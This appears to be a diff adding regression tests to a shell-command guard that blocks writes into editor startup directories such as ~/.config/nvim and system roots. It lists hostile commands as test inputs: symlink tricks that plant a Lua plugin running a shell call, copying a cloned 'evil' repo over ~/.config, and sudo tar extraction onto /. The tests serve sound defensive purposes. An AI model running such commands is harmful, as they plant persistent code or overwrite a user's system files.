@@ -1138,3 +1138,61 @@ def test_r10_mcp_move_into_gated_parent():
 ])
 def test_r10_false_positives_fixed(ev):
     assert evaluate(ev, EMPTY).rule != RULE
+
+
+# ---- QA round 11 regressions --------------------------------------------------
+
+NOHOME = "/home/nonexistent-qa-user"
+
+
+@pytest.mark.parametrize("cmd", [
+    "ln -s $HOME/.config c && echo 'vim.fn.system(\"id\")' > c/nvim/plugin/x.lua",
+    "ln -s \"$HOME/.config\" c && git clone https://github.com/a/b c/nvim",
+    "ln -s ${HOME}/.config c && cp -r /tmp/b/nvim c/",
+    "ln -sfn \"$HOME/.config\" cfg && mkdir -p cfg/nvim/plugin && cp /tmp/x.lua cfg/nvim/plugin/",
+    "ln -s $HOME h && cp -r /tmp/b/. h/", "ln -s ~/. h && cp -r /tmp/b/. h/",
+    f"git clone https://github.com/a/evil /tmp/evil && cp -r /tmp/evil {NOHOME}/.config",
+    f"cp -r /tmp/evil {NOHOME}/.config/", f"mv /tmp/evil {NOHOME}/.config",
+    f"ln -s /tmp/evil {NOHOME}/.config", f"ln -sfn /tmp/evil {NOHOME}/.config",
+    "git clone https://github.com/a/b /tmp/b && bash -c -- 'cp -r /tmp/b/. ~'",
+    "bash -c -e 'cp -r /tmp/b/* ~/.config/'", "bash -c +x 'tar xzf /tmp/x.tgz -C ~'",
+    "bash -c -- 'ln -s ~/.config c && cp /tmp/x c/nvim/init.lua'",
+    "echo 'cp -r /tmp/b/. ~' | sh", "sh -s <<< 'cp -r /tmp/b/. ~'",
+    "su -c 'cp -r /tmp/b/. ~'",
+    "sudo tar xf x.tgz -C /", "cd / && sudo tar xf r.tgz", "sudo cp -a overlay/. /",
+    "rsync -a stage/ /usr/",
+])
+@pytest.mark.parametrize("cwd", [None, "/home/u/proj"])
+def test_r11_shell_gated(cmd, cwd):
+    assert _ours(evaluate(_sh_cwd(cmd, cwd), EMPTY)), (cmd[:80], cwd)
+
+
+def test_r11_word_cap_fails_closed():
+    cmd = "tar xzf /tmp/x.tgz " + "-v " * 4001 + "-C ~"
+    assert _ours(rules.rule_editor_startup_protect(_shell(cmd), EMPTY))
+
+
+def test_r11_relative_ln_target_resolved_against_link_dir():
+    cmd = ("git clone https://github.com/a/dots /tmp/b && mkdir -p d && "
+           "ln -s ../.. d/h && cp -r /tmp/b/. d/h/")
+    assert _ours(evaluate(_sh_cwd(cmd, "/home/u/proj"), EMPTY))
+
+
+@pytest.mark.parametrize("cmd", [
+    "cd proj && git pull 2>&1 | tail -5", "cd proj && git pull | tee pull.log",
+    "cd proj && git checkout -b feature && git log --oneline | head",
+    "cd proj && git merge main 2>&1 | grep CONFLICT", "cd ~/proj && git pull | cat",
+    "cd proj && tar xzf data.tgz | head", "cd proj && bash -c 'git pull'",
+    "cd proj && sh -c 'tar xzf data.tgz'", "cd .. && git checkout \"main\"",
+])
+def test_r11_home_cwd_false_positives_fixed(cmd):
+    assert evaluate(_sh_cwd(cmd, "/home/u"), EMPTY).rule != RULE, cmd
+
+
+@pytest.mark.parametrize("cmd", [
+    "cp -r build/share /usr/local/", "sudo cp -r bin lib include /usr/local/",
+    "cp -r lib /usr/local/", "ln -s /opt/homebrew/share share",
+    "sudo tar -C /usr/local -xzf go1.22.linux-amd64.tar.gz",
+])
+def test_r11_prefix_install_false_positives_fixed(cmd):
+    assert evaluate(_sh_cwd(cmd, "/home/u/proj"), EMPTY).rule != RULE, cmd
